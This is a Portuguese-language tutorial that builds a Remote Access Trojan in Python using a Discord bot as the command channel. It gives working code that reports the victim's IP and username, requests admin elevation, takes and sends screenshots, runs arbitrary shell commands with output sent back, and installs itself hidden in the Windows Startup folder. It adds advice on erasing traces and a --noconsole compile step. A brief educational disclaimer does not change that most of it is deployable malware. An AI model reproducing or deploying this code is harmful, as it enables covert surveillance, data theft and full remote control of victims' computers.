# RAT - Remote Administration Tool

RAT (Remote Administration Tool) é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.

Basicamente, um RAT é um Cavalo de Troia de Acesso Remoto, que dá ao invasor controle total sobre o sistema infectado. Ou seja, o invasor pode fazer o que quiser no computador da vítima, sem que ela perceba.

## Principais funcionalidades de um RAT

Algumas das funcionalidades mais comuns de um RAT incluem:

- **Captura de tela:** O RAT pode capturar imagens da tela do computador da vítima, permitindo que o invasor veja o que está sendo exibido.

- **Gravação de áudio:** O RAT pode gravar áudio do microfone do computador da vítima, permitindo que o invasor escute conversas e sons do ambiente.

- **Roubo de arquivos:** O RAT pode roubar arquivos do computador da vítima, dando ao invasor acesso a documentos, fotos, vídeos e outros arquivos pessoais.

- **Execução de comandos:** O RAT pode executar comandos no sistema da vítima, permitindo que o invasor instale outros malwares, altere configurações do sistema e realize outras ações maliciosas.

Hoje, vamos criar nosso próprio RAT simples em Python!

## Como funciona um RAT?

Normalmente, para criar uma conexão remota entre o invasor e a vítima, o invasor precisa de um servidor que aguarde conexões, enquanto a vítima precisa de um cliente que se conecte a esse servidor. Porém, neste caso, não temos um servidor, mas podemos simular essa conexão usando o Discord.

Se você pensar bem, um bot do Discord pode rodar localmente no seu computador e executar comandos do sistema operacional, o que não ocorre se você rodar o bot em um servidor. Foi aí que surgiu a ideia de criar um bot do Discord que executa comandos diretamente no computador. Ou seja, se outra pessoa rodar esse bot para mim e eu tiver acesso ao chat do Discord, posso controlar o computador dela remotamente.

Caso você ainda não tenha uma conta no Discord, crie uma em [discord.com](https://discord.com) e crie um servidor para testes.

> **DISCLAIMER:** Este RAT é apenas para fins educacionais e não deve ser usado para prejudicar outras pessoas. O uso de RATs é ilegal e pode resultar em graves consequências legais

## Criando o nosso RAT

Para facilitar, já existe um repositório no GitHub com o código do RAT pronto. Se você deseja conferir o código do "RAT do Maraba", acesse [este link](https://github.com/gitinspersec/RAT-inspersec)

> **Palavras do Maraba:** "Eu me empolguei um pouco neste RAT, ele tem mais de 40 comandos que podem ser executados remotamente."

Abaixo está o template básico para iniciar um RAT com discord.py.

```py

import discord
from discord.ext import commands
import ctypes
import sys
import os
import ssl
import asyncio
import platform
import urllib.request
import json
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import win32gui
from mss import mss

################ HELP FUNCTIONS ################

def isAdmin():
    try:
        return (os.getuid() == 0)
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def restart_as_admin():
    if not isAdmin():
        executable = sys.executable
        params = ' '.join([f'"{param}"' for param in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, params, None, 1)
        sys.exit()

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

################# END HELP FUNCTIONS #################

################# VARIABLES #################

prefix = "!"
token = 'SEU_TOKEN_AQUI'
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)
ssl._create_default_https_context = ssl._create_unverified_context
channel_name = None

################# END VARIABLES #################

################# Initialize #################

async def activity():
    while True:
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await bot.change_presence(status=discord.Status.online, activity=window_displayer)
        await asyncio.sleep(3)

@bot.event
async def on_ready():
    global channel_name

    with urllib.request.urlopen("https://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country']
        ip = data['ip']

    user_name = os.getlogin()
    session_name = f"session-{user_name}"
    
    guild = bot.guilds[0]
    existing_channel = discord.utils.get(guild.channels, name=session_name)

    if existing_channel:
        await existing_channel.delete()

    new_channel = await guild.create_text_channel(session_name)
    channel_name = session_name

    is_admin = isAdmin()
    message = (f"@here :white_check_mark: New session opened {session_name} | {platform.system()} "
               f"{platform.release()} |  :flag_{flag.lower()}: | User: {user_name} | IP: {ip}")
    if is_admin:
        message += " | admin!"
    
    await new_channel.send(message)
    
    game = discord.Game(f"Window logging stopped")
    await bot.change_presence(status=discord.Status.online, activity=game)

    bot.loop.create_task(activity())

def split_message(message, limit=2000):
    adjusted_limit = limit - 6
    return [message[i:i+adjusted_limit] for i in range(0, len(message), adjusted_limit)]



@bot.command(name='help', help="Mostra esta mensagem de ajuda.")
async def help(ctx):
    help_message = "Comandos Disponíveis:\n\n"
    for command in bot.commands:
        help_message += f"{prefix}{command.name:<15} -> {command.help}\n"
    parts = split_message(help_message)
    for part in parts:
        await ctx.send(f"```{part}```")

```
#
Este é o template básico para iniciar um RAT (Remote Access Trojan) com a biblioteca `discord.py`. Com ele, você já pode começar a implementar comandos e funcionalidades personalizadas para o seu RAT.

Como exemplo, vamos adicionar um comando que captura a tela do computador alvo e envia a imagem diretamente para um canal no Discord. Isso ajudará a ilustrar como configurar e expandir as funcionalidades do RAT.
#
```py

@bot.command(name='screenshot', help=f'Tira um screenshot da tela e envia para o canal atual. Uso: {prefix}screenshot')
async def screenshot(ctx):
    with mss() as sct:
        sct.shot(output='screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')

```
#
Este comando utiliza a biblioteca mss para capturar a tela do computador alvo e enviar a imagem para o Discord. Ele cria um arquivo chamado screenshot.png, que é enviado diretamente ao canal especificado, e em seguida, o arquivo é excluído para evitar rastros no sistema.
#
> Importante: Sempre remova os arquivos temporários que você cria, evitando deixar evidências.
#
Além disso, vamos adicionar comandos para ajustar o volume do sistema ao máximo e ao mínimo. As funções `volumeup` e `volumedown` já foram implementadas para você, então basta integrá-las aos comandos do bot.
#
```py

@bot.command(name='volumeup', help='Aumenta o volume do computador. Uso: !volumeup')
async def volume_up(ctx):
    volumeup()
    await ctx.send("[*] Volume up to 100%")

@bot.command(name='volumedown', help=f'Diminui o volume do computador. Uso: {prefix}volumedown')
async def volume_down(ctx):
    volumedown()
    await ctx.send("[*] Volume down to 0%")

```
#
Vamos adicionar um comando para "falar" com o alvo, ou seja, o bot irá reproduzir uma mensagem de áudio no computador da pessoa. Imagine o impacto quando o dispositivo começar a falar sozinho!
#
```py

@bot.command(name='voice', help=f'Fala a mensagem especificada. Uso: {prefix}voice <mensagem>')
async def voice(ctx, *, message: str):
    subprocess.run(f"PowerShell -Command Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')", shell=True)
    await ctx.send(f"[*] Voice message: {message}")

```
#
Agora vamos para o comando mais crucial: a execução de comandos no sistema do alvo.

Para que o programa seja considerado um verdadeiro RAT (Remote Access Trojan), ele precisa ter a capacidade de executar comandos no sistema da vítima. Vamos, então, adicionar essa funcionalidade essencial ao nosso RAT.
#
```py

@bot.command(name='shell', help=f'Executa um comando no shell. Uso: {prefix}shell <comando>')
async def shell(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            if len(output) > 2000:
                with open("output.txt", "w") as f:
                    f.write(output)
                await ctx.send(file=discord.File("output.txt"))
            else:
                await ctx.send(f"```\n{output}\n```")
        else:
            await ctx.send("[*] Comando executado, mas sem saída.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao executar o comando: {str(e)}")

```
#
Esse comando permite executar um comando no shell e envia a saída diretamente para o Discord. Caso a saída ultrapasse 2000 caracteres, o bot cria um arquivo chamado `output.txt` e o envia no canal para garantir que todo o conteúdo seja entregue.

Com isso, você já possui um RAT básico em Python, que pode ser usado para controle remoto do computador alvo. Agora, vamos adicionar um último comando essencial para garantir que você nunca perca o controle sobre o dispositivo.
#
```py

@bot.command(name='startup', help=f'Se coloca para iniciar com o sistema e coloca o atributo de oculto. Uso: {prefix}startup')
async def startup(ctx):
    try:
        bot_path = sys.argv[0]
        bot_name = os.path.basename(bot_path)
        startup_path_en = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bot_name)
        startup_path_pt = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Menu Iniciar', 'Programas', 'Inicializar', bot_name)
        if os.path.exists(startup_path_en):
            startup_path = startup_path_en
        elif os.path.exists(startup_path_pt):
            startup_path = startup_path_pt
        else:
            await ctx.send("[!] Pasta de inicialização não encontrada.")
            return
        shutil.copy(bot_path, startup_path)
        subprocess.run(f"attrib +s +h \"{startup_path}\"", shell=True)
        await ctx.send("[*] Bot configurado para iniciar com o sistema e oculto.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao configurar o bot para iniciar com o sistema: {str(e)}")

```
#
Este comando configura o bot para iniciar automaticamente com o sistema e atribui o modo oculto, ou seja, o bot será executado assim que o sistema ligar, sem que o alvo perceba sua presença.

Bom, isso conclui nossa aula. Agora, vou mostrar o código completo do RAT para que você possa ver como ele ficou ao final. Caso apareça algum erro, aqui estão todos os imports necessários para o RAT:
#
```py
import discord
from discord.ext import commands
import ctypes
import sys
import os
import ssl
import asyncio
import platform
import urllib.request
import json
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import win32gui
from mss import mss
import cv2
import subprocess
import pyautogui as pag
import sqlite3
import webbrowser
import win32crypt
import json
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import psutil
import shutil
```

E se quiser compilar o rat, use:

```
pyinstaller --onefile --noconsole rat.py
```

(Troque `rat.py` pelo nome de seu arquivo se não for o mesmo.)